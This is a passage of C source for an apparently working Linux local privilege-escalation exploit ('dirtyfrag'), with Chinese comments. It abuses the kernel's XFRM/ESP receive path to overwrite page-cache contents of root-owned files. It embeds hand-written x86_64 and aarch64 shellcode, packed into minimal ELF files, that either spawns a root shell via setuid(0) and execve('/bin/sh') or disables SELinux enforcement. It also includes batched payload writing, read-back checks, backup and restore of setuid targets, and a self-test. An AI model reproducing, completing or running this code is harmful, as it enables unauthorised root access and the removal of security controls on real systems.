		ssize_t w = 0;

		while (w < n) {
			ssize_t k = write(ofd, buf + w, (size_t)(n - w));

			if (k <= 0)
				goto out;
			w += k;
		}
	}
	if (n < 0)
		goto out;
	if (fstat(in, &st) == 0)
		fchmod(ofd, st.st_mode & 07777);
	snprintf(out, outsz, "%s", tmpl);
	rc = 0;
out:
	close(in);
	close(ofd);
	if (rc < 0)
		unlink(tmpl);
	return rc;
}

/*
 * 尽力恢复: 用备份内容覆盖 dst。
 * 只有当前进程对 dst 有写权限才可能成功——非 root 场景下原文件属 root,
 * 这里通常会失败, 此时备份仍需保留, 由用户提权后手动恢复。
 */
static int restore_file(const char *bak, const char *dst)
{
	char buf[65536];
	ssize_t n;
	int in, ofd, rc = -1;

	in = open(bak, O_RDONLY);
	if (in < 0)
		return -1;
	ofd = open(dst, O_WRONLY | O_TRUNC);
	if (ofd < 0) {
		close(in);
		return -1;
	}
	while ((n = read(in, buf, sizeof(buf))) > 0) {
		ssize_t w = 0;

		while (w < n) {
			ssize_t k = write(ofd, buf + w, (size_t)(n - w));

			if (k <= 0)
				goto out;
			w += k;
		}
	}
	if (n < 0)
		goto out;
	/*
	 * write() 会触发内核 file_remove_privs(), 清掉 setuid/setgid 位。
	 * 从备份文件还原 mode (backup_file 已把原 mode fchmod 到备份上),
	 * 否则恢复后目标不再是 setuid root。
	 */
	{
		struct stat st;

		if (stat(bak, &st) == 0)
			fchmod(ofd, st.st_mode & 07777);
	}
	rc = 0;
out:
	close(in);
	close(ofd);
	return rc;
}

/* 失败时尝试自动恢复; 不行就明确告知备份位置和恢复命令 */
static void try_restore(const char *bak, const char *dst)
{
	if (restore_file(bak, dst) == 0) {
		pmsg("[+] 已从备份恢复原文件: %s\n", dst);
	} else {
		pmsg("[!] 自动恢复失败 (无写权限)。原文件备份在 %s\n", bak);
		pmsg("    提权后可手动恢复: cp %s %s\n", bak, dst);
	}
}

/* payload 至少得是本架构的 ELF, 否则 execve 必然失败 */
static void check_payload_elf(const uint8_t *d, size_t len)
{
	if (len < sizeof(Elf32_Ehdr) || memcmp(d, ELFMAG, SELFMAG) != 0) {
		pmsg("[!] -set 内容不是 ELF, execve 会失败\n");
		return;
	}
	if (d[EI_CLASS] == ELFCLASS64) {
		const Elf64_Ehdr *e = (const Elf64_Ehdr *)d;

		if (len < sizeof(*e))
			return;
		pmsg("[*] payload: ELF64 machine=%u type=%u entry=0x%llx "
		       "phnum=%u\n",
		       e->e_machine, e->e_type,
		       (unsigned long long)e->e_entry, e->e_phnum);
		if (HOST_EM_VAL && e->e_machine != HOST_EM_VAL)
			pmsg("[!] e_machine=%u 与本机 %u 不符, 无法执行\n",
			       e->e_machine, HOST_EM_VAL);
		if (e->e_type != ET_EXEC)
			pmsg("[!] 不是 ET_EXEC (ET_DYN 需要解释器)\n");
	} else if (d[EI_CLASS] == ELFCLASS32) {
		const Elf32_Ehdr *e = (const Elf32_Ehdr *)d;

		if (len < sizeof(*e))
			return;
		pmsg("[*] payload: ELF32 machine=%u type=%u entry=0x%x "
		       "phnum=%u\n",
		       e->e_machine, e->e_type, e->e_entry, e->e_phnum);
		if (HOST_EM_VAL && e->e_machine != HOST_EM_VAL)
			pmsg("[!] e_machine=%u 与本机 %u 不符, 无法执行\n",
			       e->e_machine, HOST_EM_VAL);
		if (e->e_type != ET_EXEC)
			pmsg("[!] 不是 ET_EXEC (ET_DYN 需要解释器)\n");
	} else {
		pmsg("[!] 未知 EI_CLASS=%u\n", d[EI_CLASS]);
	}
}

/* ======================================================================== */
/* 分批写入                                                                 */
/* ======================================================================== */

static int load_payload(const char *path, uint8_t **out, size_t *out_len)
{
	int fd = open(path, O_RDONLY);
	struct stat st;
	uint8_t *buf;
	size_t len, alloc;
	ssize_t n, off = 0;

	if (fd < 0) {
		pmsg("[-] open(%s): %s\n", path, strerror(errno));
		return -1;
	}
	if (fstat(fd, &st) < 0 || !S_ISREG(st.st_mode)) {
		pmsg("[-] %s 不是普通文件\n", path);
		close(fd);
		return -1;
	}
	len = (size_t)st.st_size;
	if (!len) {
		pmsg("[-] %s 是空文件\n", path);
		close(fd);
		return -1;
	}
	if (len > MAX_PAYLOAD) {
		pmsg("[-] payload %zu 字节超过上限 %d (%d 批)\n",
		       len, MAX_PAYLOAD, MAX_PAYLOAD / 4);
		pmsg("[-] 每 4 字节要注册一个独立 XFRM SA, 上限即 %d 个 SA\n",
		       MAX_PAYLOAD / 4);
		pmsg("[-] payload 只需覆盖目标文件开头, 不是完整替换文件;\n");
		pmsg("    ELF loader 只读 ELF 头 + PT_LOAD 覆盖的区间,\n");
		pmsg("    用几百字节的自包含 ELF 即可\n");
		close(fd);
		return -1;
	}
	alloc = (len + 3) & ~(size_t)3;   /* 4 字节对齐, 尾部补 0 */
	buf = calloc(1, alloc);
	if (!buf) {
		close(fd);
		return -1;
	}
	while (off < (ssize_t)len) {
		n = read(fd, buf + off, len - off);
		if (n <= 0) {
			pmsg("[-] read(%s): %s\n", path, n ? strerror(errno) : "eof");
			close(fd);
			free(buf);
			return -1;
		}
		off += n;
	}
	close(fd);
	*out = buf;
	*out_len = len;
	return 0;
}

/* ======================================================================== */
/* 内置 payload: setuid(0) -> 写 /sys/fs/selinux/enforce "0" -> exit       */
/* ======================================================================== */

#define SELINUX_ENFORCE "/sys/fs/selinux/enforce"

#define PAYLOAD_BASE   0x400000UL
#define PAYLOAD_HDR    (sizeof(Elf64_Ehdr) + sizeof(Elf64_Phdr))  /* 0x78 */

#if defined(__aarch64__)

/*
 * aarch64 机器码来自 disable_selinux_aarch64.S:
 *   clang --target=aarch64-linux-gnu -c dselinux.S -o d.o
 *   llvm-objcopy -O binary --only-section=.text d.o d.bin
 *
 * 21 条指令 (84 字节) 之后紧跟两个字符串, adr 的 PC 相对偏移
 * 就是按这个布局算出来的, 所以下面的拼接偏移不能改。
 */
static const uint32_t dsel_insn[] = {
	0xd2800000, /* mov  x0, #0            ; setuid 参数 */
	0xd2801248, /* mov  x8, #146          ; __NR_setuid */
	0xd4000001, /* svc  #0 */

	0x92800c60, /* mov  x0, #-100         ; AT_FDCWD */
	0x10000221, /* adr  x1, path */
	0xd2800022, /* mov  x2, #1            ; O_WRONLY */
	0xd2800003, /* mov  x3, #0 */
	0xd2800708, /* mov  x8, #56           ; __NR_openat */
	0xd4000001, /* svc  #0 */
	0xaa0003f3, /* mov  x19, x0           ; 保存 fd */

	0xaa1303e0, /* mov  x0, x19 */
	0x10000201, /* adr  x1, zero */
	0xd2800022, /* mov  x2, #1 */
	0xd2800808, /* mov  x8, #64           ; __NR_write */
	0xd4000001, /* svc  #0 */

	0xaa1303e0, /* mov  x0, x19 */
	0xd2800728, /* mov  x8, #57           ; __NR_close */
	0xd4000001, /* svc  #0 */

	0xd2800000, /* mov  x0, #0 */
	0xd2800ba8, /* mov  x8, #93           ; __NR_exit */
	0xd4000001, /* svc  #0 */
};

#define DSEL_INSN_LEN  (sizeof(dsel_insn))                        /* 0x54 */
#define DSEL_PATH_OFF  DSEL_INSN_LEN                              /* 0x54 */
#define DSEL_ZERO_OFF  (DSEL_PATH_OFF + sizeof(SELINUX_ENFORCE))  /* 0x6c */
#define DSEL_CODE_LEN  (DSEL_ZERO_OFF + 2)                        /* 0x6e */

_Static_assert(sizeof(dsel_insn) == 0x54, "指令数变了, adr 偏移失效");
_Static_assert(sizeof(SELINUX_ENFORCE) == 24, "path 长度变了, adr 偏移失效");

/* ---- root shell payload: setuid(0) -> execve("/bin/sh") ---- */
static const uint32_t rshell_insn[] = {
	0xd2800000, /* mov  x0, #0            ; setuid 参数 */
	0xd2801248, /* mov  x8, #146          ; __NR_setuid */
	0xd4000001, /* svc  #0 */

	0x100000a0, /* adr  x0, binsh */
	0x100000c1, /* adr  x1, argv */
	0xd2800002, /* mov  x2, #0            ; envp = NULL */
	0xd2801ba8, /* mov  x8, #221          ; __NR_execve */
	0xd4000001, /* svc  #0 */
};

#define RSHELL_INSN_LEN  (sizeof(rshell_insn))   /* 0x20 */
#define RSHELL_STR_OFF   RSHELL_INSN_LEN         /* 0x20 */
#define RSHELL_ARGV_OFF  (RSHELL_STR_OFF + 8)    /* 0x28, 8 字节对齐 */
#define RSHELL_CODE_LEN  (RSHELL_ARGV_OFF + 16)  /* 0x38 */

_Static_assert(sizeof(rshell_insn) == 0x20, "指令数变了, adr 偏移失效");

#define PAYLOAD_EM      EM_AARCH64
#define PAYLOAD_ARCH    "aarch64"

#elif defined(__x86_64__)

/*
 * x86_64 机器码, 逐字节手写, 只依赖 syscall 指令:
 *   反汇编验证: objdump -D -b binary -m i386:x86-64 -M intel dsel.bin
 *   lea 的 disp32 按下面的拼接布局算好, 布局不能改。
 */

/* disable_selinux: setuid(0) -> openat -> write("0") -> close -> exit */
static const uint8_t dsel_insn[] = {
	0x31, 0xff,                               /* xor  edi, edi */
	0xb8, 0x69, 0x00, 0x00, 0x00,             /* mov  eax, 105     ; setuid */
	0x0f, 0x05,                               /* syscall */
	0xb8, 0x01, 0x01, 0x00, 0x00,             /* mov  eax, 257     ; openat */
	0xbf, 0x9c, 0xff, 0xff, 0xff,             /* mov  edi, -100    ; AT_FDCWD */
	0x48, 0x8d, 0x35, 0x36, 0x00, 0x00, 0x00, /* lea  rsi, [rip+0x36] -> path */
	0xba, 0x01, 0x00, 0x00, 0x00,             /* mov  edx, 1       ; O_WRONLY */
	0x45, 0x31, 0xd2,                         /* xor  r10d, r10d   ; mode = 0 */
	0x0f, 0x05,                               /* syscall */
	0x89, 0xc7,                               /* mov  edi, eax     ; fd */
	0xb8, 0x01, 0x00, 0x00, 0x00,             /* mov  eax, 1       ; write */
	0x48, 0x8d, 0x35, 0x36, 0x00, 0x00, 0x00, /* lea  rsi, [rip+0x36] -> zero */
	0xba, 0x01, 0x00, 0x00, 0x00,             /* mov  edx, 1 */
	0x0f, 0x05,                               /* syscall */
	0xb8, 0x03, 0x00, 0x00, 0x00,             /* mov  eax, 3       ; close */
	0x0f, 0x05,                               /* syscall */
	0x31, 0xff,                               /* xor  edi, edi */
	0xb8, 0x3c, 0x00, 0x00, 0x00,             /* mov  eax, 60      ; exit */
	0x0f, 0x05,                               /* syscall */
};

#define DSEL_INSN_LEN  (sizeof(dsel_insn))                        /* 0x49 */
#define DSEL_PATH_OFF  0x50                                       /* 8 字节对齐 */
#define DSEL_ZERO_OFF  (DSEL_PATH_OFF + sizeof(SELINUX_ENFORCE))  /* 0x68 */
#define DSEL_CODE_LEN  (DSEL_ZERO_OFF + 2)                        /* 0x6a */

/* root shell: setuid(0) -> execve("/bin/sh", {"/bin/sh", NULL}, NULL) */
static const uint8_t rshell_insn[] = {
	0x31, 0xff,                               /* xor  edi, edi */
	0xb8, 0x69, 0x00, 0x00, 0x00,             /* mov  eax, 105     ; setuid */
	0x0f, 0x05,                               /* syscall */
	0xb8, 0x3b, 0x00, 0x00, 0x00,             /* mov  eax, 59      ; execve */
	0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00, /* lea  rdi, [rip+0x1b] -> binsh */
	0x48, 0x8d, 0x35, 0x24, 0x00, 0x00, 0x00, /* lea  rsi, [rip+0x24] -> argv */
	0x31, 0xd2,                               /* xor  edx, edx     ; envp = NULL */
	0x0f, 0x05,                               /* syscall */
	0x31, 0xff,                               /* xor  edi, edi     ; 失败则 exit */
	0xb8, 0x3c, 0x00, 0x00, 0x00,             /* mov  eax, 60      ; exit */
	0x0f, 0x05,                               /* syscall */
};

#define RSHELL_INSN_LEN  (sizeof(rshell_insn))   /* 0x29 */
#define RSHELL_STR_OFF   0x30                    /* 8 字节对齐 */
#define RSHELL_ARGV_OFF  0x40                    /* 8 字节对齐 */
#define RSHELL_CODE_LEN  (RSHELL_ARGV_OFF + 16)  /* 0x50 */

_Static_assert(sizeof(dsel_insn) == 0x49, "指令长度变了, lea disp32 失效");
_Static_assert(sizeof(rshell_insn) == 0x29, "指令长度变了, lea disp32 失效");
_Static_assert(sizeof(SELINUX_ENFORCE) == 24, "path 长度变了, 偏移失效");

#define PAYLOAD_EM      EM_X86_64
#define PAYLOAD_ARCH    "x86_64"

#else

#define PAYLOAD_EM      0
#define PAYLOAD_ARCH    "unknown"

#endif  /* __aarch64__ / __x86_64__ */

#if PAYLOAD_EM

/* 把一个代码块包成最小 ET_EXEC, 入口指向代码块开头 */
static uint8_t *pack_payload_elf(const void *code, size_t code_len,
				 size_t *out_total)
{
	size_t total = PAYLOAD_HDR + code_len;
	uint8_t *buf;
	Elf64_Ehdr *eh;
	Elf64_Phdr *ph;

	/* 尾部补齐到 4 字节, 与 load_payload 的语义保持一致 */
	buf = calloc(1, (total + 3) & ~(size_t)3);
	if (!buf) {
		pmsg("[-] 内存不足\n");
		return NULL;
	}
	memcpy(buf + PAYLOAD_HDR, code, code_len);

	eh = (Elf64_Ehdr *)buf;
	memcpy(eh->e_ident, ELFMAG, SELFMAG);
	eh->e_ident[EI_CLASS]   = ELFCLASS64;
	eh->e_ident[EI_DATA]    = ELFDATA2LSB;
	eh->e_ident[EI_VERSION] = EV_CURRENT;
	eh->e_ident[EI_OSABI]   = ELFOSABI_SYSV;
	eh->e_type              = ET_EXEC;
	eh->e_machine           = PAYLOAD_EM;
	eh->e_version           = EV_CURRENT;
	eh->e_entry             = PAYLOAD_BASE + PAYLOAD_HDR;
	eh->e_phoff             = sizeof(Elf64_Ehdr);
	eh->e_ehsize            = sizeof(Elf64_Ehdr);
	eh->e_phentsize         = sizeof(Elf64_Phdr);
	eh->e_phnum             = 1;

	ph = (Elf64_Phdr *)(buf + sizeof(Elf64_Ehdr));
	ph->p_type   = PT_LOAD;
	ph->p_flags  = PF_R | PF_X;
	ph->p_offset = 0;
	ph->p_vaddr  = PAYLOAD_BASE;
	ph->p_paddr  = PAYLOAD_BASE;
	ph->p_filesz = total;
	ph->p_memsz  = total;
	ph->p_align  = 0x1000;

	*out_total = total;
	return buf;
}

static int build_disable_selinux_payload(uint8_t **out, size_t *out_len)
{
	uint8_t code[DSEL_CODE_LEN];
	uint8_t *buf;

	memset(code, 0, sizeof(code));
	memcpy(code, dsel_insn, sizeof(dsel_insn));
	memcpy(code + DSEL_PATH_OFF, SELINUX_ENFORCE,
	       sizeof(SELINUX_ENFORCE));
	memcpy(code + DSEL_ZERO_OFF, "0", 2);

	buf = pack_payload_elf(code, sizeof(code), out_len);
	if (!buf)
		return -1;
	*out = buf;
	return 0;
}

static int build_root_shell_payload(uint8_t **out, size_t *out_len)
{
	uint8_t code[RSHELL_CODE_LEN];
	uint64_t binsh_addr;
	uint8_t *buf;

	memset(code, 0, sizeof(code));
	memcpy(code, rshell_insn, sizeof(rshell_insn));
	memcpy(code + RSHELL_STR_OFF, "/bin/sh", 8);

	/* argv = { binsh_addr, NULL }, 地址按 ELF 的映射基址算 */
	binsh_addr = PAYLOAD_BASE + PAYLOAD_HDR + RSHELL_STR_OFF;
	memcpy(code + RSHELL_ARGV_OFF, &binsh_addr, sizeof(binsh_addr));

	buf = pack_payload_elf(code, sizeof(code), out_len);
	if (!buf)
		return -1;
	*out = buf;
	return 0;
}

#else  /* PAYLOAD_EM == 0: 不支持的架构 */

static int build_disable_selinux_payload(uint8_t **out, size_t *out_len)
{
	(void)out;
	(void)out_len;
	pmsg("[-] -disable_selinux 的内置 payload 只支持 aarch64 / x86_64\n");
	pmsg("    当前架构没有内置机器码, 请自己汇编后用 -set 传入\n");
	return -1;
}

static int build_root_shell_payload(uint8_t **out, size_t *out_len)
{
	(void)out;
	(void)out_len;
	pmsg("[-] -root-shell 的内置 payload 只支持 aarch64 / x86_64\n");
	pmsg("    当前架构没有内置机器码, 请自己汇编后用 -set 传入\n");
	return -1;
}

#endif  /* PAYLOAD_EM */

/* 只把 ENOENT 当作"没有 SELinux"; EACCES 等不应误判 */
static int selinux_missing(void)
{
	struct stat st;

	return stat(SELINUX_ENFORCE, &st) < 0 && errno == ENOENT;
}

/* 读 /sys/fs/selinux/enforce: 1 强制, 0 宽容, -1 读不到 */
static int selinux_get_enforce(void)
{
	int fd = open(SELINUX_ENFORCE, O_RDONLY);
	char c = 0;
	ssize_t n;

	if (fd < 0)
		return -1;
	n = read(fd, &c, 1);
	close(fd);
	if (n != 1 || c < '0' || c > '1')
		return -1;
	return c - '0';
}

/* 已经是 root 时直接写, 不需要走 page-cache 写入 */
static int selinux_disable_direct(void)
{
	int fd = open(SELINUX_ENFORCE, O_WRONLY);
	int cur;

	if (fd < 0) {
		pmsg("[-] open(%s, O_WRONLY): %s\n", SELINUX_ENFORCE,
		       strerror(errno));
		if (errno == ENOENT)
			pmsg("[*] 该路径不存在: 内核没有启用 SELinux\n");
		return -1;
	}
	if (write(fd, "0", 1) != 1) {
		pmsg("[-] write(%s): %s\n", SELINUX_ENFORCE, strerror(errno));
		close(fd);
		return -1;
	}
	close(fd);

	cur = selinux_get_enforce();
	if (cur == 0) {
		pmsg("[+] SELinux 已关闭 (enforce=0)\n");
		return 0;
	}
	pmsg("[!] 已写入 0, 但回读 enforce=%d (策略或只读 fs 拦截)\n", cur);
	return -1;
}

/*
 * 分批写入: 每 4 字节一个 SA, 先全部注册, 再逐触发。
 * 返回 0 表示链路跑完 (不代表内容一定写成功, 由调用者回读校验)。
 */
static int write_payload(const char *target, uint8_t *data, size_t len,
			 off_t base_off)
{
	size_t words = (len + 3) / 4;
	size_t i;
	int failed = 0, nl_sk, udp_recv, udp_send;
	uint32_t *seqhis;
	struct stat st;
	long long need;
	long long t0, t_reg = 0, t_trig = 0, t_del = 0;
	off_t last_off;

	if (!words)
		return -1;

	/*
	 * 每批只写 4 字节, 但必须给 ESP 一个 16 字节的读取窗口:
	 *   16 字节 = 4 字节目标 + 12 字节"陪跑"
	 * 窗口不足 16, splice 拿不满 16 字节, 整批直接失败。
	 */
	need = (long long)base_off + (long long)(words - 1) * 4 + 16;
	if (stat(target, &st) < 0) {
		pmsg("[-] stat(%s): %s\n", target, strerror(errno));
		return -1;
	}
	if ((long long)st.st_size < need) {
		pmsg("[-] %s 只有 %lld 字节, 至少需要 %lld 字节\n",
		       target, (long long)st.st_size, need);
		pmsg("[-] 末批需要一个 16 字节读取窗口, 文件太小无法写入\n");
		return -1;
	}

	if (len & 3)
		pmsg("[!] payload 长度 %zu 不是 4 的倍数, 末批补 0 "
		       "会多写 %zu 字节\n", len, 4 - (len & 3));

	pmsg("[*] payload %zu 字节 -> %s @0x%llx (%zu 批, 每批 4 字节)\n",
	       len, target, (unsigned long long)base_off, words);
	last_off = base_off + (off_t)(words - 1) * 4;
	pmsg("[*] 写入范围 0x%llx..0x%llx, 末批读取窗口 0x%llx..0x%llx\n",
	       (unsigned long long)base_off,
	       (unsigned long long)(base_off + (off_t)len),
	       (unsigned long long)last_off,
	       (unsigned long long)(last_off + 16));
	pmsg("[*] SA 区间 spi 0x%08x..0x%08x, 共 %zu 个\n",
	       SPI_BASE, SPI_BASE + (uint32_t)(words - 1), words);

	seqhis = calloc(words, sizeof(*seqhis));
	if (!seqhis) {
		pmsg("[-] 内存不足\n");
		return -1;
	}
	for (i = 0; i < words; i++) {
		seqhis[i] = ((uint32_t)data[i * 4 + 0] << 24) |
			    ((uint32_t)data[i * 4 + 1] << 16) |
			    ((uint32_t)data[i * 4 + 2] << 8)  |
			    ((uint32_t)data[i * 4 + 3]);
	}

	pmsg("[*] 注册 %zu 个 XFRM SA (%d 个/批, 先发后收) ...\n",
	       words, NL_BATCH);
	nl_sk = xfrm_netlink_open();
	if (nl_sk < 0) {
		free(seqhis);
		return -1;
	}
	t0 = now_ms();
	if (xfrm_register_all(nl_sk, SPI_BASE, seqhis, words) < 0) {
		close(nl_sk);
		free(seqhis);
		return -1;
	}
	t_reg = now_ms() - t0;
	free(seqhis);

	pmsg("[*] 逐批触发写入 (每批 4 字节, delay=%d ms) ...\n", g_delay_ms);
	if (udp_socks_open(&udp_recv, &udp_send) < 0) {
		pmsg("[-] UDP socket 创建失败\n");
		close(nl_sk);
		return -1;
	}
	t0 = now_ms();
	for (i = 0; i < words; i++) {
		if (do_one_write(udp_recv, udp_send, target,
				 base_off + (off_t)i * 4,
				 SPI_BASE + (uint32_t)i) < 0) {
			LOG("word %zu (off=0x%llx spi=0x%08x) 触发返回值异常",
			    i, (unsigned long long)(base_off + (off_t)i * 4),
			    SPI_BASE + (uint32_t)i);
			failed++;
		}
		if (g_verbose && (i % 16 == 15))
			LOG("%zu/%zu", i + 1, words);
		if ((i + 1) % 100 == 0)
			pmsg("[*] 已写入 %zu/%zu SA\n", i + 1, words);
	}
	if (words % 100)
		pmsg("[*] 已写入 %zu/%zu SA\n", words, words);
	t_trig = now_ms() - t0;
	close(udp_send);
	close(udp_recv);
	pmsg("[*] 触发完成: %zu 批, 异常 %d, 耗时 %lld ms\n",
	       words, failed, t_trig);

	/* 清场: NEWSA 不会自动消失, 不删会一直挂在内核 xfrm 链表里 */
	pmsg("[*] 删除 %zu 个 SA ...\n", words);
	t0 = now_ms();
	if (xfrm_delete_all(nl_sk, SPI_BASE, words) < 0)
		pmsg("[!] 部分 SA 删除失败, 可能残留\n");
	t_del = now_ms() - t0;
	close(nl_sk);
	if (failed)
		pmsg("[!] %d/%zu 批触发返回异常 (可能仍已写入)\n",
		       failed, words);
	LOG("阶段耗时: 注册 %lld ms, 触发 %lld ms, 删除 %lld ms, 合计 %lld ms",
	    t_reg, t_trig, t_del, t_reg + t_trig + t_del);
	return 0;
}

/* 回读目标文件前 len 字节, 与 payload 比对 */
static int verify_payload(const char *target, uint8_t *data, size_t len,
			  off_t base_off)
{
	uint8_t *got;
	int fd, rc;
	size_t i, bad = 0, first = 0;
	long long t0 = now_ms();

	got = calloc(1, len);
	if (!got)
		return -1;
	fd = open(target, O_RDONLY);
	if (fd < 0) {
		pmsg("[-] reopen(%s): %s\n", target, strerror(errno));
		free(got);
		return -1;
	}
	/* pread 带显式偏移, 不依赖 fd 的当前位置, 也没有 lseek+read 的竞态 */
	if (pread(fd, got, len, base_off) != (ssize_t)len) {
		pmsg("[-] pread(%s, 0x%llx) 长度不足\n", target,
		       (unsigned long long)base_off);
		close(fd);
		free(got);
		return -1;
	}
	close(fd);

	for (i = 0; i < len; i++) {
		if (got[i] != data[i]) {
			if (bad == 0)
				first = i;
			bad++;
		}
	}

	if (bad == 0) {
		pmsg("[+] 回读校验通过: %s[0x%llx..0x%llx) 与 -set 完全一致"
		       " (%zu 字节, 耗时 %lld ms)\n",
		       target, (unsigned long long)base_off,
		       (unsigned long long)(base_off + (off_t)len),
		       len, now_ms() - t0);
		rc = 0;
	} else {
		pmsg("[-] 回读校验失败: %zu/%zu 字节不符, 首个不符偏移 0x%llx\n",
		       bad, len, (unsigned long long)(base_off + (off_t)first));
		for (i = 0; i < len && i < 32; i++)
			pmsg("    [0x%llx] got=%02x want=%02x%s\n",
			       (unsigned long long)(base_off + (off_t)i),
			       got[i], data[i],
			       got[i] == data[i] ? "" : "  <<<");
		rc = -1;
	}
	free(got);
	return rc;
}

/* ======================================================================== */
/* 自测                                                                     */
/* ======================================================================== */

static int make_filled_file(const char *path, size_t len, uint8_t fill)
{
	int fd;
	uint8_t *buf = malloc(len);

	if (!buf)
		return -1;
	memset(buf, fill, len);
	fd = open(path, O_CREAT | O_TRUNC | O_RDWR, 0644);
	if (fd < 0) {
		free(buf);
		return -1;
	}
	if (write(fd, buf, len) != (ssize_t)len) {
		close(fd);
		free(buf);
		return -1;
	}
	fsync(fd);
	close(fd);
	free(buf);
	return 0;
}

static int selftest(int no_userns)
{
	const char *path = "/tmp/dirtyfrag_selftest.bin";
	const uint32_t magic = 0x44465247u;   /* "DFRG" */
	uint8_t got[4];
	int fd, nl_sk, udp_recv, udp_send, rc = 1;

	pmsg("[*] -test: %s\n", path);

	if (setup_userns_netns(no_userns) < 0) {
		pmsg("[-] 无法建立 userns/netns (需要非特权 userns 或 root)\n");
		return 1;
	}
	if (make_filled_file(path, 4096, 'A') < 0) {
		pmsg("[-] 无法创建 %s: %s\n", path, strerror(errno));
		return 1;
	}

	pmsg("[*] 注册 1 个 SA 并触发一次 4 字节写 (offset 0)\n");
	nl_sk = xfrm_netlink_open();
	if (nl_sk < 0) {
		pmsg("[-] netlink 打开失败\n");
		return 1;
	}
	if (add_xfrm_sa(nl_sk, SPI_BASE, magic) < 0) {
		pmsg("[-] SA 注册失败\n");
		close(nl_sk);
		return 1;
	}
	if (udp_socks_open(&udp_recv, &udp_send) < 0) {
		pmsg("[-] UDP socket 创建失败\n");
		close(nl_sk);
		return 1;
	}
	if (do_one_write(udp_recv, udp_send, path, 0, SPI_BASE) < 0)
		pmsg("[!] 触发链路返回值异常, 仍检查写入结果\n");
	close(udp_send);
	close(udp_recv);

	xfrm_delete_all(nl_sk, SPI_BASE, 1);
	close(nl_sk);

	fd = open(path, O_RDONLY);
	if (fd < 0)
		return 1;
	if (pread(fd, got, 4, 0) != 4) {
		close(fd);
		return 1;
	}
	close(fd);

	pmsg("[*] file[0..4) = %02x %02x %02x %02x (期望 44 46 52 47)\n",
	       got[0], got[1], got[2], got[3]);
	if (got[0] == 0x44 && got[1] == 0x46 && got[2] == 0x52 &&
	    got[3] == 0x47) {
		pmsg("[+] 原语可达: page cache 已被改写\n");
		rc = 0;
	} else {
		pmsg("[-] 未观察到写入。可能原因:\n");
		pmsg("      1) 内核已修复 (有 skb_has_shared_frag 回退)\n");
		pmsg("      2) 缺 CONFIG_XFRM/INET_ESP/CRYPTO_AUTHENC\n");
		pmsg("      3) SA 注册失败, 用 -v 看日志\n");
	}
	unlink(path);
	return rc;
}

/* ======================================================================== */
/* 内核配置检查 (-check)                                                     */
/* ======================================================================== */

struct cfg_req {
	const char *name;
	int required;   /* 1 = 必须 y/m 才过; 0 = 建议/诊断 */
	const char *modname;  /* 若为 m, 对应的内核模块名; NULL = 非模块 */
	const char *desc;
};

/*
 * 漏洞链路直接依赖的配置: 缺任何一个, esp_input 原语都跑不起来。
 * m/y 都算通过 (模块化的 crypto / esp 运行时也能用)。
 */
static const struct cfg_req g_cfg_reqs[] = {
	{"CONFIG_XFRM",          1, NULL, "XFRM 框架 (xfrm_input / esp4)"},
	{"CONFIG_NET",           1, NULL, "网络子系统"},
	{"CONFIG_INET",          1, NULL, "IPv4 协议栈"},
	{"CONFIG_INET_ESP",      1, "esp4",    "ESP 协议 (esp_input 漏洞点)"},
	{"CONFIG_CRYPTO_AUTHENC",1, "authencesn", "authencesn (assoclen+cryptlen 处 4 字节 STORE)"},
	{"CONFIG_CRYPTO_AES",    1, "aes",     "cbc(aes) 对称算法"},
	{"CONFIG_CRYPTO_CBC",    1, "cbc",     "CBC 分组模式"},
	{"CONFIG_CRYPTO_HMAC",   1, "hmac",    "hmac 摘要算法"},
	{"CONFIG_CRYPTO_SHA256", 1, "sha256",  "hmac(sha256) 完整性算法"},
	{"CONFIG_USER_NS",       1, NULL, "非特权 userns 提权路径 (unshare NEWUSER+NEWNET)"},
	{"CONFIG_SPLICE",        0, NULL, "splice 写原语: 5.x 内核 syscall 通常无条件提供, 本机 config 未列出属正常, 实际可用性请以 -test 为准"},
	{"CONFIG_INET_UDP_DIAG", 0, "udp_diag", "UDP diag: 仅文档列出, 本 exp 未实际使用 (非必须)"},
	{NULL, 0, NULL, NULL}
};

/*
 * 找内核配置文件, 优先级:
 *   /proc/config.gz            -> gzip -dc 解压 (需 CONFIG_IKCONFIG_PROC)
 *   /boot/config-<release>
 *   /lib/modules/<release>/build/.config
 *   /usr/src/linux-headers-<release>/.config
 * 返回写入 buf 的路径, 找不到返回 NULL。
 */
static const char *find_config(char *buf, size_t sz)
{
	struct utsname ut;
	char cands[5][384];
	int n = 0, i;

	if (uname(&ut) < 0)
		return NULL;
	snprintf(cands[n++], sizeof(cands[0]), "/proc/config.gz");
	snprintf(cands[n++], sizeof(cands[0]), "/boot/config-%s", ut.release);
	snprintf(cands[n++], sizeof(cands[0]),
		 "/lib/modules/%s/build/.config", ut.release);
	snprintf(cands[n++], sizeof(cands[0]),
		 "/usr/src/linux-headers-%s/.config", ut.release);
	snprintf(cands[n++], sizeof(cands[0]),
		 "/usr/lib/modules/%s/build/.config", ut.release);

	for (i = 0; i < n; i++) {
		struct stat st;

		if (stat(cands[i], &st) == 0) {
			size_t l = strlen(cands[i]);

			if (l >= sz)
				l = sz - 1;
			memcpy(buf, cands[i], l);
			buf[l] = '\0';
			return buf;
		}
	}
	return NULL;
}

/* gz 走 gzip -dc, 普通文件直接 fopen; 统一返回 FILE* */
static FILE *open_config(const char *path)
{
	if (strstr(path, ".gz")) {
		char cmd[1536];

		snprintf(cmd, sizeof(cmd), "gzip -dc '%s' 2>/dev/null", path);
		return popen(cmd, "r");
	}
	return fopen(path, "r");
}

static void close_config(FILE *f, const char *path)
{
	if (strstr(path, ".gz"))
		pclose(f);
	else
		fclose(f);
}

/* 把配置读进内存, 避免管道不能 rewind 的问题 */
static char *read_config_to_mem(const char *path)
{
	FILE *f = open_config(path);
	char *buf;
	size_t cap = 65536, len = 0;
	char tmp[8192];
	size_t got;

	if (!f)
		return NULL;
	buf = malloc(cap);
	if (!buf) {
		close_config(f, path);
		return NULL;
	}
	while ((got = fread(tmp, 1, sizeof(tmp), f)) > 0) {
		if (len + got + 1 > cap) {
			size_t ncap = cap * 2;
			char *nb;

			if (ncap < len + got + 1)
				ncap = len + got + 1;
			nb = realloc(buf, ncap);
			if (!nb) {
				free(buf);
				close_config(f, path);
				return NULL;
			}
			buf = nb;
			cap = ncap;
		}
		memcpy(buf + len, tmp, got);
		len += got;
	}
	buf[len] = '\0';
	close_config(f, path);
	return buf;
}

/*
 * 在内存配置文本中查一个符号。
 * 返回: 2 = y (built-in), 1 = m (module), 0 = n / 未设置 / 缺失。
 * "m/y 就算通过" —— m 和 y 同样视为可用。
